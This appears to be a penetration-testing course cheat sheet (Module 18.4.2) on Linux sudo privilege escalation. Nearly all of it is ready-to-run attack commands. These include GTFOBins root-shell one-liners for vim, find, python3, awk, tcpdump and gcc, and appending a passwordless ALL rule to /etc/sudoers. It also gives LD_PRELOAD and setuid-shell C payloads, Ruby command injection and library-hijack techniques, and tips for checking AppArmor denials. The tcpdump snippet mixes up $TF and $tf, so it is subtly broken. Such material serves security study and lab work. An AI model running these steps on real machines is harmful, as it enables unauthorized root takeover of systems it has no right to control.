title: Sudo Exploitation
body: Module 18.4.2: sudo -l shows what you can run as root. Cross-ref with GTFOBins. Watch for AppArmor blocking — check /var/log/syslog if exploit fails.
cmd:
# ── CHECK SUDO PERMISSIONS ───────────────────────────
sudo -l
# Key patterns:
# (ALL : ALL) ALL              = full root — sudo -i or sudo su
# (ALL) NOPASSWD: /usr/bin/vim = run vim as root no password
# (root) /usr/bin/apt-get      = specific command

# ── FULL SUDO — INSTANT ROOT ──────────────────────────
sudo -i
sudo su
sudo /bin/bash
sudo -s

# ── COMMON GTFOBINS SUDO ONE-LINERS ──────────────────
# vim
sudo vim -c ':!/bin/bash'
sudo vim -c ':py import os; os.system("/bin/bash")'

# nano
sudo nano
# Inside nano: Ctrl+R Ctrl+X then: reset; sh 1>&0 2>&0

# find
sudo find . -exec /bin/sh ; -quit

# python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# less
sudo less /etc/passwd
# Inside less: !/bin/bash

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# apt-get (Module 18.4.2 example)
sudo apt-get changelog apt
# Inside less/pager: !/bin/sh

# tcpdump (Module 18.4.2 — may be blocked by AppArmor)
COMMAND='id'
TF=$(mktemp)
echo "$COMMAND" > $tf
chmod +x $tf
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $tf -Z root

# env
sudo env /bin/bash

# tee — write to root files
echo "user ALL=(ALL) NOPASSWD: ALL" | sudo tee -a /etc/sudoers

# ── APPARMOR — IF EXPLOIT BLOCKED ────────────────────
# Module 18.4.2: AppArmor can block sudo exploits
cat /var/log/syslog | grep "DENIED"
# apparmor="DENIED" = AppArmor blocked it
# Check status:
sudo aa-status 2>/dev/null

# ── SUDO WITH ENV VARS ────────────────────────────────
# If env_keep is set (LD_PRELOAD etc)
sudo -l | grep env_keep
# LD_PRELOAD trick:
# cat > /tmp/pe.c << EOF
# #include <stdio.h>
# #include <stdlib.h>
# void _init() { setuid(0); system("/bin/bash"); }
# EOF
gcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so <allowed_command>

# ── GCC (sudo) ────────────────────────────────────────
# sudo -l shows: /usr/bin/gcc
sudo gcc -wrapper /bin/bash,-s -o /dev/null /dev/null
# instant root shell

# Alternative — compile setuid shell:
echo 'int main(){setuid(0);setgid(0);system("/bin/bash");}' > /tmp/sh.c
sudo gcc /tmp/sh.c -o /tmp/sh
/tmp/sh

# ── SUDO VERSION EXPLOIT ──────────────────────────────
# Baron Samedit CVE-2021-3156 (sudo < 1.9.5p2)
sudo --version
sudoedit -s / 2>&1 | grep -i "usage"
# If "usage" = vulnerable

# ══════════════════════════════════════════════════
# ARGUMENT-LOCKED ENTRIES — reading the sudoers rule
# ══════════════════════════════════════════════════
# These two entries are COMPLETELY DIFFERENT:
#   (ALL) NOPASSWD: /usr/bin/ruby           <- binary only: any argument works
#   (ALL) NOPASSWD: /usr/bin/ruby /home/andrew/app/app.rb  <- binary + arg locked
#
# Binary-only: sudo ruby -e 'exec "/bin/sh"'  works → instant root (GTFOBins)
# Argument-locked: sudo ruby -e '...' prompts for password = not allowed
#   The ONLY permitted command is exactly:
#     sudo /usr/bin/ruby /home/andrew/app/app.rb
#
# Rule of thumb: if the sudoers line has a path AFTER the binary, the
# arguments are locked. Anything else requires a password.
# The exploit lives INSIDE the allowed script — not in the binary itself.

# ── STEP 1: read the allowed script ──────────────
cat /home/andrew/app/app.rb    # or whatever path sudoers specifies
# Look for:
#   system(), `, exec(), IO.popen(), Open3 — command execution
#   require, load, autoload     — library load (hijackable)
#   File.read, File.write, open — file operations
#   ENV[], ARGV[], $stdin.gets  — user-controlled input into any of the above

# ── STEP 2a: system()/backtick with your input ───
# If the script does: system("convert #{ARGV[0]}")  or  `ls #{dir}`
# and you control the argument:
sudo /usr/bin/ruby /home/andrew/app/app.rb '; /bin/bash'
# or embed a command separator in the input the script reads

# ── STEP 2b: Ruby library hijack (require) ───────
# If the script does: require 'json'  (or any library)
# Find where Ruby looks for libraries:
ruby -e 'puts $LOAD_PATH'
# If any directory in $LOAD_PATH is writable by you:
ls -la /path/to/load_path_dir/
# Drop a malicious file with the same name:
echo 'system("/bin/bash")' > /writable/dir/json.rb
sudo /usr/bin/ruby /home/andrew/app/app.rb
# Ruby loads your file as root before the real library — instant shell.

# ── STEP 2c: writable script itself ──────────────
ls -la /home/andrew/app/app.rb
# If YOU own or can write the script:
echo 'exec "/bin/bash"' >> /home/andrew/app/app.rb
sudo /usr/bin/ruby /home/andrew/app/app.rb

# ── STEP 2d: writable directory containing script ─
ls -la /home/andrew/app/
# If the DIRECTORY is writable, replace the script:
cp /home/andrew/app/app.rb /tmp/app.rb.bak
echo 'exec "/bin/bash"' > /home/andrew/app/app.rb
sudo /usr/bin/ruby /home/andrew/app/app.rb

# ── STEP 2e: environment variable injection ───────
# Ruby respects RUBYLIB and RUBYOPT — but env_reset in sudoers clears them.
# Check: sudo -l | grep -i 'env_keep\|env_reset'
# If env_keep includes RUBYLIB:
export RUBYLIB=/tmp
echo 'system("/bin/bash")' > /tmp/json.rb    # match a library the script requires
sudo /usr/bin/ruby /home/andrew/app/app.rb
warn: If tcpdump or other exploit is blocked, check /var/log/syslog for AppArmor DENIED. AppArmor profiles restrict what processes can do even with sudo. Try a different command from sudo -l.

choices.label: sudo blocked by AppArmor — try another cmd
sudo only allows reboot/halt — trigger a boot payload
